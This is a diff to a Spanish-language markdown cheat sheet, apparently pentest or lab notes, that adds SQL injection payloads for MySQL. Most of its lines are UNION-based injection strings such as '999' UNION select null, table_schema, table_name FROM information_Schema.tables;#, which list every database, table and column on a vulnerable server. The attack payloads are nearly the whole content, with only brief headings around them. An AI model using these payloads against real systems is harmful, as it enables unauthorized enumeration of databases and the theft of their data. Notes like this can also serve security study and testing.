@@ -101,8 +101,20 @@ Para explorar la estructura de Bases de datos: ver qué tablas hay, sus columnas
 ```
 select TABLE_SCHEMA, TABLE_NAME from information_schema.tables;
 2' UNION SELECT null, column_name from information_schema.columns WHERE table_name = 'users' -- -
+```
 
-
+Datos de todas las bases de datos, tablas y columnas de MySQL:
+```
 999' UNION select null, concat(information_Schema.tables.table_schema,'-->',information_Schema.columns.table_name), information_Schema.columns.column_name FROM information_Schema.columns, information_Schema.tables WHERE information_Schema.tables.table_name = information_Schema.columns.table_name;#
+```
 
+Todas las bases de datos y sus tablas de MySQL:
+```
+999' UNION select null, table_schema,table_name FROM information_Schema.tables;#
+```
+
+
+Todas las columnas de MySQL:
+```
+999' UNION select null, table_name, column_name FROM information_Schema.columns;#
 ```
